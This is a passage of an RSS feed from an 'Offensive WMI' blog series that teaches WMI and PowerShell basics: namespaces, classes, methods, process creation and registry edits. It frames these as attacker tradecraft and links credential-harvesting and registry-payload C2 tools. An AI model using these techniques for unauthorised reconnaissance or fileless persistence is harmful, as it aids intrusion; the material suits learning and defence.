<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span>Invoke<span style="color:#f92672">-</span>WmiMethod <span style="color:#f92672">-</span>Namespace root<span style="color:#960050;background-color:#1e0010">\</span><span style="color:#66d9ef">default</span> <span style="color:#f92672">-</span><span style="color:#66d9ef">Class</span> stdregprov <span style="color:#f92672">-</span>Name DeleteKey <span style="color:#f92672">@</span>(<span style="color:#ae81ff">2147483650</span>, <span style="color:#e6db74">&#34;software\openssh\CustomAgent&#34;</span>)
</span></span></code></pre></div>
    <img src="deletekey.png"  alt="newkey"  class="center"  />


<h3 id="tools-of-the-trade">Tools of the Trade</h3>
<ul>
<li><a href="https://github.com/darkoperator/Posh-SecMod/blob/master/Registry/Registry.ps1"><code>Registry.ps1</code></a> &ndash; has easy to use Powershell functions for enumerating, creating, deleting, updating keys, etc. Super useful when dealing with things manually.</li>
<li><a href="https://github.com/samratashok/nishang/blob/master/Gather/Get-Information.ps1"><code>Get-Information.ps1</code></a> &ndash; from Nishang gathers interesting information of a system via the registry.</li>
<li><a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-WmiCommand.ps1"><code>Invoke-WmiCommand.ps1</code></a> &ndash; from Powersploit is a very useful script that helps in code execution via storing payloads in the registry using WMI as a pure C2 channel.</li>
<li><a href="https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/Invoke-SessionGopher.ps1"><code>Invoke-SessionGopher.ps1</code></a> &ndash; from Powershell Empire hunts and decrypts RDP, WinSCP, FileZilla, PuTTY, etc, session informations from a system.</li>
</ul>
<h3 id="conclusion">Conclusion</h3>
<p>The registry is a treasure trove for attackers when it comes to gathering useful data. In addition, the registry can also be used to store payloads, serving as an ideal fileless attack vector and persistence mechanism. In a later part of the series, we&rsquo;ll take a look at how to create our entire C2 infra using just WMI and the registry. Now that we are done with the basics, in our next blog we&rsquo;ll start with basic reconnaissance with WMI.</p>
<p>That&rsquo;s it for now friend. Cheerio! \o/</p>
]]></content>
        </item>
        
        <item>
            <title>Offensive WMI - Exploring Namespaces, Classes &amp; Methods (Part 2)</title>
            <link>https://0xinfection.xyz/posts/offensive-wmi-exploring-namespaces-classes-methods-part-2/</link>
            <pubDate>Sun, 05 Sep 2021 00:00:00 +0530</pubDate>
            
            <guid>https://0xinfection.xyz/posts/offensive-wmi-exploring-namespaces-classes-methods-part-2/</guid>
            <description>&lt;p&gt;This blog post is the second part of the &amp;ldquo;Offensive WMI&amp;rdquo; series (the first is &lt;a href=&#34;https://0xinfection.github.io/posts/wmi-basics-part-1/&#34;&gt;here&lt;/a&gt;), and this article will be focusing on the 3 major components in WMI that we&amp;rsquo;d be majorly dealing with. Throughout the article, we&amp;rsquo;ll be using both WMI and CIM cmdlets interchangeably so that we&amp;rsquo;re well-versed with both cmdlet types.&lt;/p&gt;
&lt;h2 id=&#34;namespaces&#34;&gt;Namespaces&lt;/h2&gt;
&lt;p&gt;Let&amp;rsquo;s recall what namespaces are in simple terms:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;A &lt;strong&gt;namespace&lt;/strong&gt; organizes information similar to folders in a filesystem. However, instead of physical locations (like on a disk), they are more logical in nature.&lt;/p&gt;</description>
            <content type="html"><![CDATA[<p>This blog post is the second part of the &ldquo;Offensive WMI&rdquo; series (the first is <a href="https://0xinfection.github.io/posts/wmi-basics-part-1/">here</a>), and this article will be focusing on the 3 major components in WMI that we&rsquo;d be majorly dealing with. Throughout the article, we&rsquo;ll be using both WMI and CIM cmdlets interchangeably so that we&rsquo;re well-versed with both cmdlet types.</p>
<h2 id="namespaces">Namespaces</h2>
<p>Let&rsquo;s recall what namespaces are in simple terms:</p>
<blockquote>
<p>A <strong>namespace</strong> organizes information similar to folders in a filesystem. However, instead of physical locations (like on a disk), they are more logical in nature.</p></blockquote>
<p>All namespaces in WMI are instances of the <code>__Namespace</code> system class. To get a list of all namespaces under the <code>root</code> namespace, we can query the same class using:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">Get</span><span style="color:#f92672">-</span>WmiObject <span style="color:#f92672">-</span>Namespace root <span style="color:#f92672">-</span><span style="color:#66d9ef">Class</span> __Namespace
</span></span></code></pre></div>
    <img src="namespace_long.png"  alt="namespace"  class="center"  />


<p>The output contains a lot of info, so to filter out the noise, we can use Powershell&rsquo;s <code>select</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">Get</span><span style="color:#f92672">-</span>WmiObject <span style="color:#f92672">-</span>Namespace root <span style="color:#f92672">-</span><span style="color:#66d9ef">Class</span> __Namespace <span style="color:#f92672">|</span> <span style="color:#66d9ef">select</span> name
</span></span></code></pre></div>
    <img src="namespace_short.png"  alt="namespace"  class="center"  />


<p>Now we have a list of namespaces on our system. All these namespaces will be referred to as <code>root\&lt;namespace&gt;</code>, e.g. <code>root\DEFAULT</code>, <code>root\CIMV2</code>, etc, since they are namespaces under the root namespace.</p>
<blockquote>
<p><strong>NOTE:</strong> One weirdly intriguing fact is that the default namespace in WMI is not <code>root\DEFAULT</code> but rather <code>root\CIMV2</code> (it has been like this since Windows 2000).</p></blockquote>
<p>The same can be achieved using the CIM cmdlet <code>Get-CimInstance</code>, where there is no need of :</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">Get</span><span style="color:#f92672">-</span>CimInstance <span style="color:#f92672">-</span>Namespace root <span style="color:#f92672">-</span>ClassName __Namespace
</span></span></code></pre></div>
    <img src="namecim.png"  alt="namespace"  class="center"  />


<p>Okay, now that&rsquo;s sorted, what about nested namespaces? We already saw that there are several namespaces under the <code>root</code> namespace. We can simply write up a script that recursively gets us the namespaces (from <a href="https://powershellmagazine.com/2013/10/18/pstip-list-all-wmi-namespaces-on-a-system/">PSMag</a>):</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>Function Get-WmiNamespace <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>    Param <span style="color:#f92672">(</span>
</span></span><span style="display:flex;"><span>        $Namespace<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;root&#39;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>    Get-WmiObject -Namespace $Namespace -Class __NAMESPACE | ForEach-Object <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>            <span style="color:#f92672">(</span>$ns <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;{0}\{1}&#39;</span> -f $_.__NAMESPACE,$_.Name<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>            Get-WmiNamespace $ns
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
</span></span></code></pre></div>
    <img src="nestedname.png"  alt="namespace"  class="center"  />


<blockquote>
<p><strong>NOTE:</strong> The classes and namespaces may vary from machine to machine depending upon the hardware available, applications installed, and many other factors.</p></blockquote>
<h2 id="classes">Classes</h2>
<p>Now that we have a list of namespaces available to make use of, let&rsquo;s take a look at classes. So what are classes?</p>
<blockquote>
<p>A <strong>WMI class</strong> represents a specific item in your system. It could be anything ranging from system processes to hardware (e.g. a network card), services, etc.</p></blockquote>
<p>Now, classes are divided into 3 major categories (this is a requirement of the CIM standard):</p>
<ul>
<li><strong>Core classes</strong>: They apply to all areas of management and provide few basic functionalities. You&rsquo;ll usually see them starting with double underscores (e.g. <code>__SystemSecurity</code>).</li>
<li><strong>Common classes</strong>: These are extensions of core classes, and apply to specific management areas. You&rsquo;ll identify one when you see a class prefixed with <code>CIM_</code> (e.g. <code>CIM_TemperatureSensor</code>).</li>
<li><strong>Extended classes</strong>: These are extra additions to common classes based on tech stacks. (e.g. <code>Win32_Process</code>).</li>
</ul>
<p>Classes are further divided into these types:</p>
<ul>
<li><strong>Abstract classes</strong>: These are templates to define new classes.</li>
<li><strong>Static classes</strong>: Mostly used to store data.</li>
<li><strong>Dynamic classes</strong>: These are retrieved from a provider and represents a WMI managed resource. We&rsquo;re mostly interested in classes of this type.</li>
<li><strong>Association classes</strong>: Describes relationships between classes and managed resources.</li>
</ul>
<h3 id="listing-classes">Listing Classes</h3>
<p>Enough theory. Let&rsquo;s try to find some classes. Once again, we can use the <code>Get-WmiObject</code> cmdlet to list the available classes:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">Get</span><span style="color:#f92672">-</span>WmiObject <span style="color:#f92672">-</span><span style="color:#66d9ef">Class</span> <span style="color:#f92672">*</span> <span style="color:#f92672">-</span>List
</span></span></code></pre></div><p>This will list all the classes above, but for the sake of an example, let&rsquo;s say we are interested in the users on the system. We can narrow down to our specific use case using the following command, which lists all available classes for fetching/manipulating user information:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">Get</span><span style="color:#f92672">-</span>WmiObject <span style="color:#f92672">-</span><span style="color:#66d9ef">Class</span> <span style="color:#f92672">*</span><span style="color:#66d9ef">user</span><span style="color:#f92672">*</span> <span style="color:#f92672">-</span>List
</span></span></code></pre></div>
    <img src="userclasseswmi.png"  alt="wmiclasses"  class="center"  />


<p>The same can be achieved with the <code>Get-CimClass</code> cmdlet also:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">Get</span><span style="color:#f92672">-</span>CimClass <span style="color:#f92672">-</span>ClassName <span style="color:#f92672">*</span><span style="color:#66d9ef">user</span><span style="color:#f92672">*</span>
</span></span></code></pre></div>
    <img src="userclassescim.png"  alt="cimclasses"  class="center"  />


<blockquote>
<p><strong>NOTE:</strong> For a list of all Win32 classes, you can refer to <a href="https://docs.microsoft.com/en-us/windows/win32/cimwin32prov/win32-provider">Microsoft&rsquo;s documentation on classes</a>. The Win32 provider provides classes for 4 different categories: Computer System Hardware Classes, Operating System Classes, Performance Counter Classes and WMI Service Management Classes.</p></blockquote>
<p>Remember that we talked about <em>dynamic</em> classes being the ones that provide us instances? To get only the dynamic classes, we can make use of the <code>-QualifierName</code> switch of <code>Get-CimClass</code> cmdlet:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">Get</span><span style="color:#f92672">-</span>CimClass <span style="color:#f92672">-</span>ClassName <span style="color:#f92672">*</span><span style="color:#66d9ef">user</span><span style="color:#f92672">*</span> <span style="color:#f92672">-</span>QualifierName <span style="color:#66d9ef">dynamic</span>
</span></span></code></pre></div>
    <img src="dynamicclass.png"  alt="dynamicclasses"  class="center"  />


<p>So far so good. What&rsquo;s next? Querying the classes to get the juicy stuff out of them.</p>
<h3 id="fetching-classes">Fetching Classes</h3>
<p>We&rsquo;re interested in the <code>Win32_UserAccount</code> class this time. Fetching data is simple, we can simply:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">Get</span><span style="color:#f92672">-</span>WmiObject <span style="color:#f92672">-</span><span style="color:#66d9ef">Class</span> Win32_UserAccount
</span></span></code></pre></div>
    <img src="users.png"  alt="users"  class="center"  />


<blockquote>
<p><strong>TIP</strong>: To get a more verbose output, you can pipe the above command into Powershell&rsquo;s <code>Format-List</code> or <code>fl</code>, something like: <code>Get-WmiObject -Class Win32_UserAccount | fl *</code> which will get you everything the class has to offer.</p></blockquote>
<p>The CIM cmdlet <code>Get-CimInstance</code> can also be used to fetch the same info:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">Get</span><span style="color:#f92672">-</span>CimInstance <span style="color:#f92672">-</span>ClassName Win32_UserAccount
</span></span></code></pre></div>
    <img src="users2.png"  alt="users"  class="center"  />


<p>Now we have a list of all user accounts on the system!</p>
<p>Let&rsquo;s turn our attention to the processes running on the system. The class <code>Win32_Process</code> gives us a list of processes running on the system:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">Get</span><span style="color:#f92672">-</span>WmiObject <span style="color:#f92672">-</span><span style="color:#66d9ef">Class</span> Win32_Process
</span></span></code></pre></div><p>It is not uncommon for a lot of processes to be running on a system that might make your terminal keep scrolling endlessly! To avoid that we can use the <code>-Filter</code> switch to get a specific process we are looking for (here we&rsquo;ve picked <code>lsass.exe</code>):</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">Get</span><span style="color:#f92672">-</span>WmiObject <span style="color:#f92672">-</span><span style="color:#66d9ef">Class</span> Win32_Process <span style="color:#f92672">-</span>Filter <span style="color:#e6db74">&#39;name=&#34;lsass.exe&#34;&#39;</span>
</span></span></code></pre></div>
    <img src="lsass.png"  alt="processes"  class="center"  />


<p>The CIM cmdlet alternative <code>Get-CimInstance</code> gives a shorter, more comprehensive output in this case (and it also supports the <code>-Filter</code> switch):</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">Get</span><span style="color:#f92672">-</span>CimInstance <span style="color:#f92672">-</span>ClassName Win32_Process
</span></span></code></pre></div>
    <img src="processes.png"  alt="processes"  class="center"  />


<p>An idiomatic expression doing the same with WQL is as below:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">Get</span><span style="color:#f92672">-</span>WmiObject <span style="color:#f92672">-</span>Query <span style="color:#e6db74">&#39;select * from win32_process where name=&#34;lsass.exe&#34;&#39;</span>
</span></span></code></pre></div><p>Okay, now we know about listing, fetching and filtering instances of classes in WMI. Let&rsquo;s look at how removing instances works in WMI.</p>
<h3 id="removing-class-instances">Removing Class Instances</h3>
<p>The <code>Remove-WmiObject</code> (for WMI cmdlets) and <code>Remove-CimInstance</code> (for CIM cmdlets) are two cmdlets that have the capabilities of removing instances. You can pipe the output of a relevant command to the cmdlets. For a quick demo, let&rsquo;s run our favourite calculator app and list the process.</p>

    <img src="calc.png"  alt="calc"  class="center"  />


<p>What happens if we pipe the command to <code>Remove-CimInstance</code>? The process gets killed!</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">Get</span><span style="color:#f92672">-</span>CimInstance <span style="color:#f92672">-</span>ClassName Win32_Process <span style="color:#f92672">-</span>Filter <span style="color:#e6db74">&#39;name=&#34;calculator.exe&#34;&#39;</span> <span style="color:#f92672">|</span> Remove<span style="color:#f92672">-</span>CimInstance
</span></span></code></pre></div>
    <img src="killed.png"  alt="calc"  class="center"  />


<p>This is extremely useful when messing around with Registry, or better, in a situation where we&rsquo;ve created our own classes for storing our payloads and stuff &ndash; we can simply use the cmdlet to list all items under the class and thereby cleaning them up all in one go.</p>
<h2 id="methods">Methods</h2>
<p>Methods are ways provided to manipulate WMI objects. If you scroll up to the place where we listed all the classes available, you&rsquo;ll notice a column called <code>Methods</code> which lists available methods.</p>
<h3 id="listing-methods">Listing Methods</h3>
<p>To repeat our chore and list all available methods, we can do something like:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">Get</span><span style="color:#f92672">-</span>CimClass <span style="color:#f92672">-</span>MethodName <span style="color:#f92672">*</span>
</span></span></code></pre></div><p>To filter out instances that allow us to perform a specific method, we can pass a method name, for example, <code>Create</code> (which is always interesting because it might allow us to create something):</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">Get</span><span style="color:#f92672">-</span>CimClass <span style="color:#f92672">-</span>MethodName <span style="color:#66d9ef">Create</span>
</span></span></code></pre></div>
    <img src="create.png"  alt="create"  class="center"  />


<p>Further narrowing things down, to list available methods for a specific class, we need to use Powershell&rsquo;s <code>select</code> with the <code>-ExpandProperty</code> switch:</p>
<p>With <code>Get-WmiObject</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">Get</span><span style="color:#f92672">-</span>WmiObject <span style="color:#f92672">-</span><span style="color:#66d9ef">Class</span> Win32_Process <span style="color:#f92672">-</span>List <span style="color:#f92672">|</span> <span style="color:#66d9ef">select</span> <span style="color:#f92672">-</span>ExpandProperty Methods
</span></span></code></pre></div><p>With <code>Get-CimClass</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">Get</span><span style="color:#f92672">-</span>CimClass <span style="color:#f92672">-</span>ClassName Win32_Process <span style="color:#f92672">|</span> <span style="color:#66d9ef">select</span> <span style="color:#f92672">-</span>ExpandProperty CimClassMethods
</span></span></code></pre></div>
    <img src="classmethods.png"  alt="classmethods"  class="center"  />


<blockquote>
<p><strong>NOTE</strong>: Please note that the value passed to <code>select</code> statement is the name of the column which we got when listing the classes. If you&rsquo;re confused, scroll up to the paragraph where we listed a class and observe the output difference between WMI and CIM cmdlet output.</p></blockquote>
<p>So, we have methods like <code>Create</code>, <code>Terminate</code>, <code>GetOwner</code>, <code>GetOwnerSid</code>, etc for the Win32_Process class. Great. Now let us see how we can use methods.</p>
<blockquote>
<p><strong>TIP</strong>: To use a method, we need to know what parameters do we need to supply when calling the method. To list all available parameters, we can use a combination of Powershell or better just read the <a href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/invoke-wmimethod?view=powershell-5.1#parameters">documentation</a>.</p></blockquote>
<h3 id="using-methods">Using Methods</h3>
<p>The <code>Invoke-WmiMethod</code> (for WMI) and <code>Invoke-CimMethod</code> (for CIM cmdlets) allows us to use the methods for a specific class. Let&rsquo;s try to spawn a calculator:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span>Invoke<span style="color:#f92672">-</span>WmiMethod <span style="color:#f92672">-</span><span style="color:#66d9ef">Class</span> Win32_Process <span style="color:#f92672">-</span>Name <span style="color:#66d9ef">Create</span> <span style="color:#f92672">-</span>ArgumentList calc.exe
</span></span></code></pre></div>
    <img src="createcalc.png"  alt="calcspawn"  class="center"  />


<p>To use the CIM cmdlet, the syntax varies slightly:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span>Invoke<span style="color:#f92672">-</span>CimMethod <span style="color:#f92672">-</span>ClassName Win32_Process <span style="color:#f92672">-</span>MethodName <span style="color:#66d9ef">create</span> <span style="color:#f92672">-</span>Arguments <span style="color:#f92672">@</span><span style="color:#960050;background-color:#1e0010">{</span>commandline<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;calc.exe&#34;</span><span style="color:#960050;background-color:#1e0010">}</span>
</span></span></code></pre></div>
    <img src="calccim.png"  alt="calcspwn"  class="center"  />


<p>Well, now we know about spawning new processes!</p>
<h2 id="setting-properties-of-objects">Setting Properties of Objects</h2>
<p>Last but not the least, we should take a look at updating instances of a class. However, it is important to keep in mind that the instance should be writable. With a bit of scripting, we can cook up a recipe for getting all writable properties of an class. Here&rsquo;s the script (sourced from <a href="https://powershellmagazine.com/2012/09/06/pstip-get-all-writeable-properties-of-a-wmi-class/">PSMag</a>):</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$class <span style="color:#f92672">=</span> <span style="color:#f92672">[</span>wmiclass<span style="color:#f92672">]</span><span style="color:#e6db74">&#39;&lt;class_name&gt;&#39;</span>
</span></span><span style="display:flex;"><span>$class.Properties | ForEach-Object <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>      foreach <span style="color:#f92672">(</span>$qualifier in $_.Qualifiers<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>           <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>$qualifier.Name -eq <span style="color:#e6db74">&#34;Write&#34;</span><span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>                $_.Name
</span></span><span style="display:flex;"><span>           <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
</span></span></code></pre></div><p>For our example, we&rsquo;ll use the class <code>Win32_OperatingSystem</code>, which has a writable property called <code>Description</code> (essentially the description of the OS).</p>

    <img src="osdesc.png"  alt="osdesc"  class="center"  />


<p>Let us update the property name to <code>PewOS</code> using `Set-WmiInstance:</p>

    <img src="updatedname.png"  alt="osdesc"  class="center"  />


<p>The same could be achieved with <code>Set-CimInstance</code>, but that is left up to the reader to explore. :)</p>
<h2 id="conclusion">Conclusion</h2>
<p>Whew, that was a long read! By now, we have a solid foundation of both the WMI and CIM cmdlets and how they can be used to achieve significant control over a system. So far thanks for being here, and I&rsquo;ll see you in the blog. Cheers! 🥂</p>
]]></content>
        </item>
        
        <item>
            <title>Offensive WMI - The Basics (Part 1)</title>
            <link>https://0xinfection.xyz/posts/offensive-wmi-the-basics-part-1/</link>
            <pubDate>Sun, 29 Aug 2021 00:00:00 +0530</pubDate>
            
            <guid>https://0xinfection.xyz/posts/offensive-wmi-the-basics-part-1/</guid>
            <description>&lt;p&gt;This blog post is the first of a many part series on WMI and is intended for fairly new audiences. A basic understanding of Powershell will definitely help the reader while going through the blog, however, it is not a requirement. That&amp;rsquo;s it, let us jump into the real stuff.&lt;/p&gt;
&lt;h2 id=&#34;introduction&#34;&gt;Introduction&lt;/h2&gt;
&lt;h3 id=&#34;why-wmi&#34;&gt;Why WMI?&lt;/h3&gt;
&lt;p&gt;WMI is a set of specifications from Microsoft that was designed for fast and efficient administration when it comes to Windows systems. And as you might know, a rule of security says &amp;ldquo;that anything useful for administration is also great at being abused by evil-doers&amp;rdquo;. WMI can &lt;em&gt;really&lt;/em&gt; do a lot of things &amp;ndash; from gathering statuses of computers and configuring settings to running applications and executing code. Moreover, WMI is present on all available Windows OS versions, so targeted surface is quite broad here.&lt;/p&gt;</description>
            <content type="html"><![CDATA[<p>This blog post is the first of a many part series on WMI and is intended for fairly new audiences. A basic understanding of Powershell will definitely help the reader while going through the blog, however, it is not a requirement. That&rsquo;s it, let us jump into the real stuff.</p>
<h2 id="introduction">Introduction</h2>
<h3 id="why-wmi">Why WMI?</h3>
<p>WMI is a set of specifications from Microsoft that was designed for fast and efficient administration when it comes to Windows systems. And as you might know, a rule of security says &ldquo;that anything useful for administration is also great at being abused by evil-doers&rdquo;. WMI can <em>really</em> do a lot of things &ndash; from gathering statuses of computers and configuring settings to running applications and executing code. Moreover, WMI is present on all available Windows OS versions, so targeted surface is quite broad here.</p>
<h3 id="what-is-wmi">What is WMI?</h3>
<p>Let&rsquo;s quickly go over a few important terms. WMI stands for <strong>Windows Management Instrumentation</strong>, which is Microsoft&rsquo;s implementation of the CIM (Common Information Model) &amp; WBEM (Web-Based Enterprise Management) &ndash; both of which are <em>DMTF (Distributed Management Task Force) standards</em> in general. WMI gives us a neat and uniform interface for applications/scripts to manage a computer (maybe remote and local) &ndash; incl. processes, services, etc.</p>
<h3 id="the-wmi-architecture">The WMI Architecture</h3>
<p>Understanding the architecture is very essential to understanding how the entire WMI ecosystem works. A broad overview of the architecture of WMI is depicted below (sourced from <a href="https://www.blackhat.com/docs/us-15/materials/us-15-Graeber-Abusing-Windows-Management-Instrumentation-WMI-To-Build-A-Persistent%20Asynchronous-And-Fileless-Backdoor-wp.pdf">Graeber&rsquo;s talk from BHUSA 15</a>):</p>

    <img src="arch.png"  alt="Architecture"  class="center"  />


<p>Let&rsquo;s break down the major components one by one:</p>
<ul>
<li>
<p><strong>Clients/Consumers</strong>: These are essentially the end consumers which interact with WMI classes for querying data, running methods, etc. Few prominent clients include <code>wmic.exe</code>, <code>wbemtest.exe</code>, <code>winrm.exe</code>, VBScript/JScript and ofc Powershell cmdlets.</p>
</li>
<li>
<p><strong>Query Languages</strong>: Just like SQL provides you with a way to query a database, WMI too has WQL (WMI Query Language) / CQL for querying the WMI service. When it comes to managing remote boxes, the WBEM standard kicks in &ndash; which include DCOM and WS-Man (don&rsquo;t worry if you don&rsquo;t understand these terms, read on). WQL is basically SQL syntax for WMI, so is not case-sensitive.</p>
<p>A simple query may look like this:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">select</span> <span style="color:#f92672">*</span> <span style="color:#66d9ef">from</span> win32_bios
</span></span></code></pre></div><p>which gives us information about our BIOS.</p>
</li>
<li>
<p><strong>Repositories</strong>: These are the databases that we talked about previously that stores all static data (definitions) of classes. The repositories are defined by MOF (managed object format) files which define the structure, classes, namespaces, etc. The database files can be found under the <code>%WINDIR%\System32\Wbem\Repository</code> directory.</p>

        <img src="repo.png"  alt="repositories"  class="center"  />
    

</li>
<li>
<p><strong>MOF Files</strong>: MOF files are basically used to define WMI namespaces, classes, providers, etc. You&rsquo;ll usually find them under the <code>%WINDIR%\System32\Wbem</code> directory with the extension <code>.mof</code>. In a later part of the series, we&rsquo;ll take a look at how we can write our own MOF files to extend the feature-set of WMI.</p>
</li>
<li>
<p><strong>Providers</strong>: Whatever is defined in the repositories can be accessed with the help of WMI providers. They are usually DLL files and associated with a MOF file &ndash; <code>cimwin32.dll</code>, <code>stdprov.dll</code>, etc to name a few, however, they can take the form of other types as well (Class, Event, Event Consumer, Method, etc). The providers are essential to the ecosystem because they monitor events and data from specific defined objects. Think of providers like drivers which provide a bridge between managed objects and WMI.</p>
<p>In the screenshot below, the DLL files are the providers of the associated MOF files:</p>

        <img src="mof.png"  alt="MOF files"  class="center"  />
    

</li>
<li>
<p><strong>Managed Objects</strong>: These are aliases of the resources in context, i.e. a managed object can be the service, process or OS being managed by WMI.</p>
</li>
<li>
<p><strong>Namespaces</strong>: Put simply, namespaces are logical divisions of classes meant for easy discovery and usage. They are divided into 3 groups:</p>
<ul>
<li>system</li>
<li>core</li>
<li>extension</li>
</ul>
<p>and 3 types:</p>
<ul>
<li>abstract</li>
<li>static</li>
<li>dynamic</li>
</ul>
<p>Few prominent namespaces that come by default are: <code>root\cimv2</code>, <code>root\default</code>, <code>root\security</code>, <code>root\subscription</code>, etc.</p>
</li>
</ul>
<p>That&rsquo;s it with the architecture. Now let&rsquo;s learn a bit about using WMI with Powershell.</p>
<h2 id="using-wmi-with-powershell">Using WMI with Powershell</h2>
<p>Now that we&rsquo;re done with the theory part, let&rsquo;s quickly spawn a PS terminal. It is important to remember that up to v2 of Powershell, there are only a few cmdlets to interact with WMI. We&rsquo;ll quickly check our Powershell version and change the version to 2:</p>

    <img src="version.png"  alt="version"  class="center"  />


<p>Now, lets run <code>Get-Command -CommandType Cmdlet *wmi*</code> in a Powershell prompt. This leads us to:</p>

    <img src="wmicmds.png"  alt="WMI"  class="center"  />


<blockquote>
